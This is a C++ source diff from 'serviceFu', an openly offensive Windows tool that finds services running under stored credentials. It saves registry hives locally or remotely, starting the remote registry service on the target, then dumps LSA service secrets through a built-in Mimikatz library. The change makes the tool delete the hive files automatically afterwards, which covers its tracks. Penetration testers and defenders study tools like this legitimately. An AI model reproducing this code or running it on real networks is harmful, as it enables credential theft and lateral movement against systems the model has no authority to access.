@@ -464,7 +464,7 @@ void start_remote_registry_svc(SC_HANDLE sc, std::string target)
 	}
 }
 
-void svcfu(std::vector<std::string> targets, std::string destDir, bool forceSave, bool saveReg, bool delReg, bool runMimikatz)
+void svcfu(std::vector<std::string> targets, std::string destDir, bool saveReg, bool runMimikatz)
 {
 	bool local = true;
 	PSVC_STRUCT *svc_arr = NULL;
@@ -503,23 +503,27 @@ void svcfu(std::vector<std::string> targets, std::string destDir, bool forceSave
 		std::vector<std::string> savedFiles;
 		if(saveReg) {
 			//if interesting service found or force flag set
-			if(ret_size > 0 || forceSave) {
+			//if(ret_size > 0 ) {
 				
-				//Save registry hives for getting credentials
-				if(local) {
-					savedFiles = save_local_reg_hive(destDir);
-				} else {
-					start_remote_registry_svc(sc, target);
-					savedFiles = save_remote_reg_hive(target, destDir);
-				}
+			//Save registry hives for getting credentials
+			if(local) {
+				savedFiles = save_local_reg_hive(destDir);
+			} else {
+				start_remote_registry_svc(sc, target);
+				savedFiles = save_remote_reg_hive(target, destDir);
 			}
+			//}
 
 			if(runMimikatz) {
 				//use mimikatz to obtain credentials
 #ifdef MIMIKATZLIB
 				if(savedFiles.size() > 1) {
 					//printf("[+] Mimikatz LSA Secrets Dump\n\n");
-					dump_svc_secrets(svc_arr, ret_size, savedFiles[1], savedFiles[0]);										
+					dump_svc_secrets(svc_arr, ret_size, savedFiles[1], savedFiles[0]);		
+
+					for(std::string file : savedFiles) {
+						DeleteFileA(file.c_str());
+					}
 
 				} else {
 					printf("[-] Registry hive files not retrieved\n");
@@ -528,13 +532,6 @@ void svcfu(std::vector<std::string> targets, std::string destDir, bool forceSave
 				printf("[-] Mimikatz support not compiled in. Rebuild\n");
 #endif
 			} 
-
-			if(delReg) {
-				//delete registry hive files
-				for(std::string file : savedFiles) {
-					DeleteFileA(file.c_str());
-				}
-			}
 
 		} 
 
@@ -552,17 +549,15 @@ void svcfu(std::vector<std::string> targets, std::string destDir, bool forceSave
 
 void usage()
 {
-	printf("\nserviceFu - Find interesting services\n");
+	printf("\nserviceFu - Find credentialed services\n\n");
 	printf("Usage:\n");
-	printf("   h              help - show this help message\n");
-	printf("   v num          verbosity - level of displayed information\n");
-	printf("   t targets      target(s) - target computer(s) (default localhost). Accepts ranges and comma separated entries\n");
-	printf("   o directory    output directory - directory to write registry hives\n");
-	printf("   i file         ignore - user accounts to ignore from results\n");
-	printf("   m              mimikatz - automatically use mimikatz to find creds\n");
-	printf("   d              delete - delete registry hive files after mimikatz run\n");
-	printf("   r              registry - grab registry hives if interesting services discovered\n");
-	printf("   f              force save - force saving registry hives even if interesting services not found\n");
+	printf("   -h              print usage menu\n");
+	printf("   -r              save registry hives\n");
+	printf("   -o directory    directory to write registry hives\n");
+	printf("   -i file         user accounts to ignore from results\n");
+	printf("   -m              use mimikatz to decrypt service credentials\n");
+	printf("   -t targets      target(s) - target computer(s) (default localhost).\n");
+	printf("                               Accepts IP ranges and comma separated IPs\n");
 }
 
 /**
@@ -586,41 +581,36 @@ int main(int argc, char** argv)
 	char* outputDir = NULL;
 	char* ignoreFile = NULL;
 	bool runMimikatz = false;
-	bool delReg = false;
+	//bool delReg = false;
 	bool saveReg = false;
 	bool forceSave = false;
 
 	//argument parsing
 	int c = 0;
 	while((c = getopt(argc, argv, "hv:t:o:i:mdrf")) != -1) {
+
 		switch(c) {
 			case 'h':
 				usage();
 				return 1;
-			case 'v':
-				verbosity = atoi(optarg); //TODO unsafe..fix this
-				break;
 			case 't':
-				targetsInput = optarg;
+				if( optarg != NULL )
+					targetsInput = optarg;
 				break;
 			case 'o':
-				outputDir = optarg;
+				if( optarg != NULL )
+					outputDir = optarg;
 				break;
 			case 'i':
-				ignoreFile = optarg;
+				if( optarg != NULL )
+					ignoreFile = optarg;
 				break;
 			case 'm':
 				runMimikatz = true;
-				delReg = true;
-				break;
-			case 'd':
-				delReg = true;
+				saveReg = true;
 				break;
 			case 'r':
 				saveReg = true;
-				break;
-			case 'f':
-				forceSave = true;
 				break;
 			case '?':
 				printf("\n[-] Unrecognized option: %c\n\n", c);
@@ -634,9 +624,9 @@ int main(int argc, char** argv)
 	}
 
 	//pares user input: ignore accounts
-	if(ignoreFile) {
+	if(ignoreFile)
 		parse_ignore_file(std::string(ignoreFile));
-	}
+	
 
 	//parse user input: targets
 	std::vector<std::string> targets;
@@ -660,7 +650,7 @@ int main(int argc, char** argv)
 	}
 
 	//main logic function
-	svcfu(targets, destDir, forceSave, saveReg, delReg, runMimikatz);
+	svcfu(targets, destDir, saveReg, runMimikatz);
 
 	return 0;
 }
